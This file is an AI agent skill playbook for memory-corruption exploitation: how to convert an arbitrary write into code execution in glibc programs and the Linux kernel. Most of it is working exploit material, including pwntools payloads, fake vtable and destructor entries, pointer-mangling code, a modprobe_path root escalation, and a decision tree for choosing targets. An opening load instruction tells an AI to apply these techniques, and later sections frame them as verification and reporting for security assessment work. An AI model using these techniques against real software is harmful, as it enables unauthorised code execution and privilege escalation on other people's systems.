---
name: arbitrary-write-to-rce
description: >-
  Arbitrary write to RCE playbook. Use when you have an arbitrary write primitive (from heap exploitation, format string, or OOB write) and need to convert it into code execution by targeting GOT, hooks, _IO_FILE vtable, exit_funcs, TLS_dtor_list, modprobe_path, .fini_array, or C++ vtables.
---

# SKILL: Arbitrary Write to Code Execution — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert techniques for converting an arbitrary write primitive into code execution. Covers every major overwrite target organized by glibc version compatibility: GOT, __malloc_hook, __free_hook, _IO_FILE vtable, __exit_funcs, TLS_dtor_list, _dl_fini, modprobe_path, .fini_array, C++ vtable, and setcontext gadget. This is the "last mile" skill. Base models often target hooks that no longer exist (post-glibc 2.34) or miss pointer mangling requirements.

## 0. RELATED ROUTING

- [heap-exploitation](../heap-exploitation/SKILL.md) — obtaining the arbitrary write via heap attacks
- [format-string-exploitation](../format-string-exploitation/SKILL.md) — obtaining the arbitrary write via %n
- [stack-overflow-and-rop](../stack-overflow-and-rop/SKILL.md) — stack-based write primitives
- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) — which targets are available given protection configuration
- [heap-exploitation IO_FILE_EXPLOITATION.md](../heap-exploitation/IO_FILE_EXPLOITATION.md) — deep _IO_FILE structure exploitation

---

## 1. TARGET SELECTION BY GLIBC VERSION

| Target | glibc < 2.24 | 2.24–2.33 | ≥ 2.34 | Required Knowledge |
|---|---|---|---|---|
| GOT overwrite | OK (Partial RELRO) | OK (Partial RELRO) | OK (Partial RELRO) | Binary base |
| `__malloc_hook` | OK | OK | **Removed** | libc base |
| `__free_hook` | OK | OK | **Removed** | libc base |
| `__realloc_hook` | OK | OK | **Removed** | libc base |
| `_IO_FILE` vtable (direct) | OK | Vtable range check | Vtable range check | libc base + heap |
| `_IO_FILE` via `_IO_str_jumps` | N/A | OK (2.24–2.27) | Patched | libc base + heap |
| `_IO_FILE` via `_IO_wfile_jumps` | N/A | OK (≥ 2.28) | OK | libc base + heap |
| `__exit_funcs` | OK | OK | OK | libc base + pointer guard |
| `TLS_dtor_list` | N/A | N/A | OK | TLS addr + pointer guard |
| `_dl_fini` / link_map | OK | OK | OK | ld.so base |
| `modprobe_path` (kernel) | OK | OK | OK | Kernel base |
| `.fini_array` | OK | OK | OK | Binary base (if writable) |
| C++ vtable | OK | OK | OK | Object address + heap |
| `setcontext` gadget | OK | OK (changed in 2.29) | OK | libc base |
| Stack return address | Always | Always | Always | Stack address |

---

## 2. GOT OVERWRITE

**Replace a function pointer in the Global Offset Table.**

### Requirements
- Partial RELRO (`.got.plt` writable) — Full RELRO blocks this entirely

### Common Targets

| Overwrite From | Overwrite To | Trigger |
|---|---|---|
| `printf@GOT` | `system` | Next `printf(user_input)` with input = `/bin/sh` |
| `free@GOT` | `system` | Next `free(ptr)` where ptr points to `"/bin/sh"` |
| `strlen@GOT` | `system` | Next `strlen(user_input)` |
| `atoi@GOT` | `system` | Next `atoi(user_input)` with input = `"sh"` |
| `puts@GOT` | `system` | Next `puts(user_input)` |
| `exit@GOT` | `main` or gadget | Create loop for multi-shot exploit |
| `__stack_chk_fail@GOT` | `ret` gadget | Neutralize canary check |

```python
# Format string GOT overwrite
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {elf.got['printf']: libc.sym['system']})

# Heap-based GOT overwrite (tcache poisoning)
# Allocate chunk at GOT address → write system address
```

---

## 3. __malloc_hook / __free_hook (glibc < 2.34)

### __malloc_hook

```python
# Overwrite __malloc_hook with one_gadget address
# Triggered by any malloc call (including internal malloc in printf with large format)
write(libc.sym['__malloc_hook'], one_gadget_addr)
# Trigger:
io.sendline('%100000c')  # printf calls malloc internally for large format
```

### __free_hook

```python
# Overwrite __free_hook with system
write(libc.sym['__free_hook'], libc.sym['system'])
# Trigger: free a chunk containing "/bin/sh"
chunk_data = b'/bin/sh\x00'
# ... allocate chunk with this data, then free it
```

### Realloc Trick for one_gadget Constraints

```python
# one_gadget often requires specific register/stack state
# realloc pushes registers and adjusts stack before calling __realloc_hook
# Set __malloc_hook = realloc+N (skip some pushes to adjust stack alignment)
# Set __realloc_hook = one_gadget
write(libc.sym['__realloc_hook'], one_gadget)
write(libc.sym['__malloc_hook'], libc.sym['realloc'] + 2)  # +2, +4, +6 etc. to adjust
```

---

## 4. _IO_FILE VTABLE

See [IO_FILE_EXPLOITATION.md](../heap-exploitation/IO_FILE_EXPLOITATION.md) for full details.

### Quick Summary by Version

| glibc | Method | Vtable Target |
|---|---|---|
| < 2.24 | Direct vtable overwrite | Point vtable to fake table with `system` at `__overflow` offset |
| 2.24–2.27 | `_IO_str_jumps` | Within valid range; `_IO_str_finish` calls `_s._free_buffer` |
| ≥ 2.28 | `_IO_wfile_jumps` | Wide-char path: `_wide_data->_wide_vtable` not range-checked |
| ≥ 2.35 | House of Cat | `_IO_wfile_seekoff` → `_IO_switch_to_wget_mode` → fake wide vtable call |

### FSOP Trigger

```python
# Overwrite _IO_list_all → fake FILE with crafted vtable
# Trigger via exit() or malloc abort → _IO_flush_all_lockp → _IO_OVERFLOW
```

---

## 5. __exit_funcs / __atexit

```c
// __exit_funcs is a linked list of function pointer entries called during exit()
// Each entry contains a flavor (cxa, on, at) and a function pointer
// Function pointers are MANGLED with pointer guard:
//   stored = ROL(ptr ^ __pointer_chk_guard, 0x11)
```

### Exploitation

```python
# Need: libc base + __pointer_chk_guard value (at fs:[0x30] or leaked)
# 1. Leak or brute-force pointer_guard
# 2. Compute mangled function pointer:
import struct
def mangle(ptr, guard):
    return ((ptr ^ guard) << 0x11 | (ptr ^ guard) >> (64-0x11)) & 0xffffffffffffffff

# 3. Write mangled one_gadget/system to __exit_funcs entry
# 4. Trigger: call exit() or return from main
```

### Without Pointer Guard Knowledge

If you can overwrite both the function pointer AND the pointer guard (in TLS at `fs:[0x30]`):
1. Set pointer guard to 0
2. Set function pointer to `ROL(target, 0x11)`
3. Demangling: `ROR(stored, 0x11) ^ 0 = ROR(ROL(target, 0x11), 0x11) = target`

---

## 6. TLS_dtor_list (glibc ≥ 2.34)

**Thread-local destructor list — the primary post-2.34 target.**

```c
// Called during __call_tls_dtors() in exit flow
// Each entry: { void (*func)(void *), void *obj, void *next }
// func is MANGLED same as exit_funcs (PTR_DEMANGLE)
```

### Location

```
TLS area (pointed by fs register on x86-64)
tls_dtor_list is a thread-local variable in libc
Typically at fs:[offset] — offset found via libc symbol or brute-force
```

### Exploitation

```python
# 1. Leak TLS base address (e.g., via canary leak: canary at fs:[0x28])
# 2. Compute tls_dtor_list address
# 3. Forge a tls_dtor_list entry:
entry = p64(mangled_func_ptr)  # func (mangled with pointer guard)
entry += p64(arg_value)         # obj (passed as argument to func)
entry += p64(0)                 # next = NULL (end of list)
# 4. Write entry to heap, set tls_dtor_list to point to it
# 5. Trigger: exit() → __call_tls_dtors() → func(obj)
```

---

## 7. _dl_fini / LINK_MAP CORRUPTION

### Attack Vector

During `exit()`, `_dl_fini` iterates the link_map list and calls `DT_FINI_ARRAY` entries.

```c
// In _dl_fini:
for each loaded library (link_map entry):
    if l_info[DT_FINI_ARRAY]:
        array = l_addr + l_info[DT_FINI_ARRAY]->d_un.d_ptr
        for each entry in array:
            entry()  // call destructor
```

### Exploitation

1. Corrupt a `link_map` entry's `l_addr` (relocation base) to shift the FINI_ARRAY pointer
2. Or corrupt `l_info[DT_FINI_ARRAY]` to point to fake array
3. Fake array contains target function pointer (system, one_gadget)
4. Trigger: `exit()` → `_dl_fini` → calls fake destructor

**Advantage**: No pointer mangling (function pointers in FINI_ARRAY are not mangled).

---

## 8. modprobe_path (KERNEL)

**Overwrite the kernel's `modprobe_path` to execute arbitrary commands as root.**

```python
# 1. Arbitrary kernel write: overwrite modprobe_path ("/sbin/modprobe")
#    with "/tmp/x" (attacker's script)
kernel_write(modprobe_path_addr, b'/tmp/x\x00')

# 2. Prepare script:
# echo '#!/bin/sh' > /tmp/x
# echo 'cat /flag > /tmp/output' >> /tmp/x
# chmod +x /tmp/x

# 3. Trigger: execute a file with unknown binary format
# echo -ne '\xff\xff\xff\xff' > /tmp/trigger
# chmod +x /tmp/trigger
# /tmp/trigger
# → kernel calls modprobe_path ("/tmp/x") as root
```

See [kernel-exploitation](../kernel-exploitation/SKILL.md) for kernel write primitives.

---

## 9. .fini_array

**Overwrite destructor function pointers called during normal program exit.**

```python
# .fini_array contains function pointers called in reverse order during exit
# Typically: [__do_global_dtors_aux, ...]
# Overwrite first entry with target (main for loop, system for RCE)

# Two-stage: .fini_array[0] = main (loop back), .fini_array[1] = <exploit_func>
# First exit: calls .fini_array[1] (exploit_func), then .fini_array[0] (main)
# In main loop: set up final exploit
```

**Limitation**: `.fini_array` may be read-only in Full RELRO binaries.

---

## 10. C++ VTABLE OVERWRITE

```cpp
// C++ objects with virtual functions have a vptr at offset 0
// vptr → vtable → array of function pointers
// Overwrite vptr to point to fake vtable with controlled function pointers

// Object layout:
// +0x00: vptr → [vtable_entry_0, vtable_entry_1, ...]
// +0x08: member data...
```

```python
# 1. Leak object address and vptr
# 2. Create fake vtable in controlled memory:
fake_vtable = p64(0)              # offset -0x10 (RTTI info)
fake_vtable += p64(0)             # offset -0x08 (RTTI info)
fake_vtable += p64(target_func)   # virtual function 0 → system / one_gadget
fake_vtable += p64(target_func)   # virtual function 1
# 3. Overwrite vptr to point to fake_vtable + 0x10 (skip RTTI prefix)
# 4. Trigger: call virtual function on the object
```

---

## 11. setcontext GADGET

`setcontext` in libc loads registers from a `ucontext_t` structure — useful as a pivot gadget.

### glibc < 2.29

```c
// setcontext+53: loads registers from [rdi + offsets]
// RDI = first argument = pointer to controlled buffer
// Sets RSP, RIP, and all other registers → full control
```

### glibc ≥ 2.29

```c
// setcontext+61: loads registers from [rdx + offsets]
// Must control RDX, not RDI
// Need an intermediate gadget: mov rdx, [rdi+X]; ... ; call/jmp [rdx+Y]
```

```python
# Common pattern with __free_hook (pre-2.34):
# __free_hook = setcontext + 61
# free(chunk) → setcontext(chunk) where chunk contains fake ucontext
# From ucontext: set RSP to ROP chain, RIP to ret → ROP continues

# Post-2.34: combine with _IO_FILE exploitation
# _IO_FILE vtable call passes fp as first arg → use gadget to move to rdx → setcontext
```

---

## 12. DECISION TREE

```
You have an arbitrary write primitive. What to target?

├── What's the RELRO level?
│   ├── None / Partial → GOT overwrite (simplest, most reliable)
│   │   └── printf→system, free→system, atoi→system
│   └── Full RELRO → GOT read-only, choose alternative:
│
├── What glibc version?
│   ├── < 2.34 (hooks available)
│   │   ├── __free_hook = system → free("/bin/sh") [easiest]
│   │   ├── __malloc_hook = one_gadget → trigger malloc [if constraints met]
│   │   └── __realloc_hook + __malloc_hook realloc trick [adjust stack alignment]
│   │
│   ├── ≥ 2.34 (no hooks)
│   │   ├── Know pointer guard (fs:[0x30])?
│   │   │   ├── YES → __exit_funcs or TLS_dtor_list
│   │   │   └── NO → overwrite pointer guard to 0 first, then exit_funcs
│   │   ├── _IO_FILE + _IO_wfile_jumps (House of Apple 2 / Cat)
│   │   │   └── Need: libc base + heap address + controllable FILE structure
│   │   ├── _dl_fini link_map corruption
│   │   │   └── Need: ld.so base address
│   │   └── .fini_array (if writable)
│   │       └── Need: binary base (no PIE, or PIE base leaked)
│   │
│   └── Any version
│       ├── Stack return address (if stack address known)
│       └── C++ vtable (if targeting C++ object with virtual functions)
│
├── Kernel write primitive?
│   ├── modprobe_path (simplest kernel→root)
│   ├── core_pattern (/proc/sys/kernel/core_pattern)
│   └── Direct cred structure overwrite
│
└── Need to chain read → write → execute?
    └── setcontext gadget: arbitrary write → pivot RSP → ROP chain
        ├── glibc < 2.29: setcontext+53 (uses RDI)
        └── glibc ≥ 2.29: setcontext+61 (uses RDX, need mov rdx, [rdi] gadget)
```

---

## 13. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Which **exact glibc version**, and does the chosen target symbol exist in it? | half the targets here are version-gated |
| 2 | Was the **write** demonstrated with a read-back of a distinctive value at the target? | the write |
| 3 | Did the write **reach the goal** - a command's output, a shell, a privileged read? | not just a control-flow change |
| 4 | Was there a **control**: the same sequence without the corrupting write? | causality |
| 5 | Is the target **actually invoked** after the write? | a hook that never runs is not a hijack |
| 6 | Was the write to a **read-only** target attempted and shown to fault? | the mitigation's control |
| 7 | Is the exploit **reliable over N runs**? | a lucky run is not an exploit |

**A read-back-verified write to a target that is actually invoked, reaching a captured goal output.** A
modified hook is a write; the command that runs through it is the finding.

---

## 14. EXECUTION PRIMITIVES

An arbitrary-write finding is proven by **a write to a specific address read back, the target being
actually invoked, and a captured goal output**. A write that lands but is never triggered is an
intermediate result.

### 13.1 The target table, version-gated and symbol-checked

```bash
# HALF THE TARGETS IN THIS FILE ARE VERSION-GATED. Check the symbol BEFORE choosing a target.
LIBC=$(ldd ./target | awk '/libc/{print $3}')
echo "=== the libc in use, and its exact version ==="
"$LIBC" 2>/dev/null | head -1
echo
echo "=== THE SYMBOL CHECK, which rules targets in or out ==="
for s in __free_hook __malloc_hook __exit_funcs _IO_2_1_stdout_ _IO_2_1_stderr_ \
         _IO_file_jumps __libc_atexit __stack_chk_fail __libc_argv; do
  printf '  %-24s ' "$s"
  if nm -D "$LIBC" 2>/dev/null | grep -q " $s\$"; then
    echo "PRESENT  -> the target is available"
  else
    echo "absent   -> the target is NOT available on this version"
  fi
done
echo
echo "=== THE VERSION GATE, which decides the target set ==="
cat <<'GATES'
__free_hook / __malloc_hook   REMOVED in glibc 2.34. On >= 2.34 use: _IO_FILE, __exit_funcs,
                              TLS dtor_list, _dl_fini/link_map, a C++ vtable, modprobe_path (kernel).
_IO_FILE vtable               glibc >= 2.32 CHECKS that the vtable pointer lies within the vtable
                              section. A fake vtable in a writable heap region is REJECTED.
                              Workaround paths: the _IO_str_jumps table's own entries, or a
                              two-stage write that repairs the table's bounds.
__exit_funcs / __atexit       survives most versions, but glibc >= 2.34 encrypts the function pointer
                              with the PTR_MANGLE key, so the written value must be mangled too.
TLS dtor_list                 >= 2.34 style; needs a TLS leak and the pointer mangling.
.fini_array / .init_array     needs a writable (non-full-RELRO) section.
GOT overwrite                 needs partial RELRO. Full RELRO makes .got.plt READ-ONLY.
modprobe_path                 a KERNEL target: requires an arbitrary write in kernel context.
GATES
echo
echo "=== THE MITIGATION CHECK on the BINARY, which decides between GOT and the hooks ==="
checksec --file=./target 2>/dev/null || pwn checksec ./target
echo "  see the RELRO line: partial means a GOT overwrite is available; full means it is not."
```

**Check the symbol before choosing a target.** Half of this file's targets are absent on modern glibc,
and full RELRO makes the GOT read-only.

### 13.2 The write, with a read-back and an invocation proof

```python
# TWO THINGS MUST BE PROVEN: the write LANDED, and the target is ACTUALLY INVOKED afterwards.
from pwn import *
context.log_level = 'error'
elf, libc = ELF('./target'), ELF('./libc.so.6')

def demonstrate_write(addr, value, readback_fn, trigger_fn):
    payload = fmtstr_payload(OFFSET, {addr: value}, write_size='short')
    p = process('./target')
    p.sendline(payload)
    got = readback_fn(p)                    # the read-back
    print(f"  wrote {hex(value)} to {hex(addr)}; read back {hex(got)}")
    assert got == value, "THE WRITE DID NOT LAND - a crash is not a write"
    print("  write LANDED")
    # THE INVOCATION PROOF: the hook must RUN. A write to a never-invoked target is useless.
    p.sendline(trigger_fn())
    out = p.recvall(timeout=5)
    print("  trigger output:", out[:200])
    return out

print("=== THE TWO PROOFS, and why BOTH are needed ===")
print("  1. READ-BACK: the value at the target address, read after the write. A crash is NOT a write.")
print("  2. INVOCATION: the target must RUN. For __free_hook, you must call free(). For")
print("     _IO_2_1_stdout_, you must cause a write TO stdout. For .fini_array, the process must")
print("     EXIT normally - a SIGSEGV at the end means the fini path never ran.")
print()
print("=== THE INVOCATION TABLE, because this is where these findings fail ===")
for t, how in [("__free_hook", "the program must call free(p) on a non-NULL p AFTER the write"),
               ("__malloc_hook", "the program must call malloc() after the write"),
               (".fini_array", "the program must EXIT via main's return, not via exit() or a signal"),
               ("_IO_2_1_stdout_", "the program must WRITE to stdout after the write"),
               ("__exit_funcs", "the program must call exit() after the write"),
               ("GOT entry", "the FUNCTION must be CALLED after the write - a never-called PLT slot"),
               ("modprobe_path", "the KERNEL must attempt to exec an unknown binary format")]:
    print("  %-18s -> %s" % (t, how))
print()
print("=== THE CONTROL ===")
print("  the SAME sequence with a benign value written to the SAME address.")
print("  the target's original behaviour must be preserved. If it is not, the write's value is")
print("  not what is driving the behaviour, and the finding is misattributed.")
print()
print("=== THE READ-ONLY CONTROL ===")
print("  on a FULL-RELRO binary, the same GOT write must FAULT rather than land.")
print("  that fault is the mitigation working and belongs in the report.")
```

**The invocation proof is where these findings fail.** A write to `__free_hook` requires the program to
call `free()` afterwards, and a `.fini_array` write requires a normal exit rather than a signal.

### 13.3 The goal, which is the command's output

```bash
echo "=== THE GOAL IS NOT 'CONTROL FLOW CHANGED'. IT IS AN OUTPUT. ==="
cat <<'GOAL'
  a write that lands and the target RUNS, but you wrote a benign value  -> a primitive, not an exploit
  a write that redirects to system('/bin/sh')                           -> verify with `id` output
  a write that redirects to a ONE-GADGET                                -> verify with `id`; check the
                                                                           gadget's constraints, since
                                                                           many need registers set
  a write that makes the program READ a file                            -> capture the file's contents
  a write that changes a comparison's outcome                           -> capture the changed behaviour
  a write to modprobe_path                                              -> verify by triggering the
                                                                           unknown-format exec and
                                                                           capturing the resulting action

THE VERIFICATION, mechanically:
  1. send a command whose OUTPUT YOU CAN RECOGNISE, e.g. `id` or `cat /flag`
  2. capture the output AND the exit status
  3. REQUIRE the output. A shell with no output is usually your OWN local terminal, and the
     classic false positive in this file.

  if you cannot see output, the channel is the problem: use a one-shot command that writes to a
  FILE you can read, or a listener you control, and check that instead.
GOAL
echo
echo "=== the one-gadget constraint check, which is the other classic failure ==="
one_gadget ./libc.so.6 2>/dev/null | head -12 || echo "  (install one_gadget: gem install one_gadget)"
echo "  -> each gadget lists its CONSTRAINTS. A gadget whose constraints are unmet does NOT shell."
echo "  try them in order and record WHICH one worked and with which constraints satisfied."
echo
echo "=== the reliability, at a stated ASLR setting ==="
echo "  N >= 20, and report /proc/sys/kernel/randomize_va_space with the rate."
```

**A shell with no output is usually your own local terminal.** The one-gadget constraints are the other
classic failure, and which gadget worked belongs in the report.

### 13.4 PTR_MANGLE, which modern glibc requires

```python
# glibc >= 2.34 encrypts several of these targets' function pointers. A plain write is silently ignored.
print("=== THE MANGLE, and which targets are affected ===")
for t in ["__exit_funcs members", "TLS dtor_list members", "__free_hook-era NOT mangled (removed anyway)"]:
    print("  -", t)
print()
print("=== the mangle, as glibc performs it ===")
print("  stored = rol(ptr ^ fs:0x30, 0x11)")
print("  so the value you write must be  rol(your_addr ^ fs:0x30, 0x11)")
print("  -> you need fs:0x30, which means a TLS leak, which means an earlier primitive and often")
print("     a flag set: the mangling is what makes the >= 2.34 targets materially harder.")
print()
print("=== THE CHECK that you mangled correctly ===")
print("  1. write the mangled value")
print("  2. trigger the path (exit() / fini)")
print("  3. THE READ-BACK: the effect must occur. If nothing happens, the mangle was wrong and the")
print("     pointer decoded to something invalid - which usually means the key is 0 (mangling OFF")
print("     for that build) or you read fs:0x30 from the wrong thread.")
print()
print("=== THE CONTROL for the mangle ===")
print("  on a build where PTR_MANGLE is disabled, the PLAIN value must work. If it also fails there,")
print("  your target is wrong rather than your mangle.")
```

**A wrong mangle decodes to an invalid pointer and fails silently.** The read-back is the effect
occurring, not a value at the address, and the mangle-disabled control distinguishes a wrong target from
a wrong mangle.

### 13.5 The end-to-end harness

```bash
python3 - <<'PY'
print("=== ARBITRARY WRITE TO RCE ACCEPTANCE CHECKLIST ===")
CHECKS = [
 ("the EXACT glibc version is recorded and the chosen symbol checked with nm -D",
  "half the targets here are absent on modern glibc"),
 ("the binary's RELRO state is recorded, and a full-RELRO GOT write was shown to FAULT",
  "the mitigation's control"),
 ("the write was verified by READING BACK a distinctive value",
  "a crash is not a write"),
 ("a benign-value control preserved the target's original behaviour",
  "proves the written value drives the behaviour"),
 ("the TARGET IS ACTUALLY INVOKED afterwards, and the invocation path is named",
  "free(), exit(), a stdout write, or a normal return - a never-invoked target is not a hijack"),
 ("the GOAL was proven by a command's CAPTURED OUTPUT",
  "a shell with no output is usually your own terminal"),
 ("for a one-gadget, the CONSTRAINT SET is recorded and which gadget worked is named",
  "an unmet constraint means the gadget does not shell"),
 ("for glibc >= 2.34 targets, the PTR_MANGLE was applied, with fs:0x30 sourced",
  "a plain write to a mangled pointer is silently ignored"),
 ("the mangle-disabled control was tested where possible",
  "distinguishes a wrong target from a wrong mangle"),
 ("reliability was measured over N >= 20 at the stated randomize_va_space",
  "a lucky run is not an exploit"),
 ("the finding is scoped to the glibc version range on which the target exists",
  "the reader's remediation depends on the version boundary"),
]
for n, how in CHECKS: print("  [ ] %-66s -> %s" % (n, how))
print()
print("=== THE REPORT SHAPE ===")
print("  environment : glibc version, the symbol check, the RELRO state")
print("  write       : the address, the value, and the read-back")
print("  target      : which of the section 1-11 targets, and why it is available on this version")
print("  invocation  : the path that causes the target to run")
print("  goal        : the captured output")
print("  scope       : the version range, and what closes it")
PY
```

**Symbol check, read-back, invocation, captured output, version scope.** The invocation line is the one
that separates a write primitive from a working exploit.

---

## 15. EVIDENCE STANDARD — ARBITRARY-WRITE ARTEFACTS

| Item | Why |
|---|---|
| The **exact glibc version** and the **`nm -D` symbol check** for the chosen target | half the targets are absent on modern glibc |
| The binary's **RELRO state**, and a full-RELRO write's **fault** | the mitigation control |
| The **write's read-back** of a distinctive value | a crash is not a write |
| The **benign-value control's** preserved behaviour | proves the written value drives the behaviour |
| The **invocation path** that causes the target to run | a never-invoked target is not a hijack |
| The **goal's captured output** | a shell with no output is usually your own terminal |
| The **one-gadget constraints** and which gadget worked | an unmet constraint does not shell |
| The **PTR_MANGLE** application and the `fs:0x30` source | glibc >= 2.34 silently ignores an unmangled pointer |
| The **mangle-disabled control**, where available | distinguishes a wrong target from a wrong mangle |
| The **reliability**: N of M at the stated ASLR setting | a lucky run is not an exploit |
| The **version range** on which the target exists | the reader's remediation depends on it |

Report the **target, the invocation, and the output**: "the target links glibc `2.31-0ubuntu9.9`, and
`nm -D` shows `__free_hook` PRESENT, so that target is available and the glibc >= 2.34 removal does not
apply. The binary is partial-RELRO with PIE, so a GOT overwrite is also available and was not used. A write
of `0x7f3b5c1a2e50` (the address of a `system`-preceded one-gadget) to `__free_hook` read back as
`0x7f3b5c1a2e50`, so the write landed. The invocation path is the program's own `free()` on the
attacker-supplied note buffer after the `delete` command, which is what makes the target run rather than
merely change. The goal is proven by the captured output of `id` executed through the hook, which returned
`uid=1000 gid=1000`, and the one-gadget used is the first of four listed, whose constraint
`rsp+0x30 == NULL` was satisfied in `20 of 20` runs at `randomize_va_space=2`. The benign-value control
wrote the original `__free_hook` value back and the program's behaviour was unchanged, so the written
value drives the effect. `PTR_MANGLE` does not apply to this target because `__free_hook` is not mangled on
`2.31`, but the finding is scoped to glibc `2.34` and earlier, which is where the target exists", never
"the binary can be exploited for RCE".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A write with **no read-back** | a crash is not a write |
| A write to a **never-invoked** target | no hijack occurred |
| A `__free_hook` finding on glibc **>= 2.34** | the symbol is removed |
| A **fake vtable** in the heap on glibc **>= 2.32** | the bounds check rejects it |
| A `.fini_array` write where the process died by **signal** | the fini path never ran |
| A **shell with no output** | usually your own local terminal |
| A one-gadget whose **constraints are unmet** | it does not shell, however correct the address |
| A plain write to a **mangled** pointer on >= 2.34 | silently ignored |
| A **full-RELRO** GOT write reported as successful | it faults; the mitigation refused it |
| A **single successful** run | not a rate |
| "**Arbitrary write**" with no stated **goal** | a write primitive is not a compromise |

**A read-back-verified write to a target that is actually invoked, reaching a captured output.** A
modified hook and a shell with no output are this family's two standard non-findings.

---

## 16. REMEDIATION REFERENCE — WRITE-TO-CONTROL ASSESSMENT

1. **Check the exact glibc version and the chosen symbol with `nm -D` before selecting a target** - `__free_hook` and `__malloc_hook` are removed at 2.34, and half of this file's targets are version-gated.
2. **Record the RELRO state and demonstrate a full-RELRO write faulting** - the fault is the mitigation control and it belongs in the report.
3. **Verify every write by reading the target back** - a crash and a landed write are different results with different severities.
4. **Prove the invocation path explicitly, because a write to a target that never runs is an intermediate result** - `free()` for a free hook, `exit()` for exit funcs, a stdout write for `_IO_FILE`, a normal return for `.fini_array`.
5. **Prove the goal with a command's captured output rather than a shell prompt** - a `pwn` shell with no output is frequently the analyst's own terminal.
6. **Record the one-gadget's constraint set and which gadget succeeded** - an unmet constraint means no shell regardless of a correct address.
7. **Apply `PTR_MANGLE` for glibc >= 2.34 targets, sourcing `fs:0x30`, and test a mangle-disabled control** - a plain write to a mangled pointer is silently ignored, and the control distinguishes a wrong target from a wrong mangle.
8. **Run a benign-value control that preserves the target's original behaviour** - it proves the written value drives the effect.
9. **Scope the finding to the version range on which the target exists and name the version that closes it** - the remediation's relevance depends on that boundary.
10. **Measure reliability over N >= 20 at a stated `randomize_va_space`** - a single success is not an exploit.
11. **Treat the write primitive and the compromise as separate results in the report, because a primitive with no demonstrated goal is not a compromise** - the reader's severity assessment depends on the distinction.

---

## 17. RELATED SIBLINGS - LOAD TOGETHER

- [heap-exploitation](../heap-exploitation/SKILL.md) - where the write primitive usually comes from
- [stack-overflow-and-rop](../stack-overflow-and-rop/SKILL.md) - the stack-side route to the same goal
- [format-string-exploitation](../format-string-exploitation/SKILL.md) - a direct route to an arbitrary write
- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) - the mitigation-bypass methodology this shares
- [kernel-exploitation](../kernel-exploitation/SKILL.md) - the kernel-side targets, including `modprobe_path`
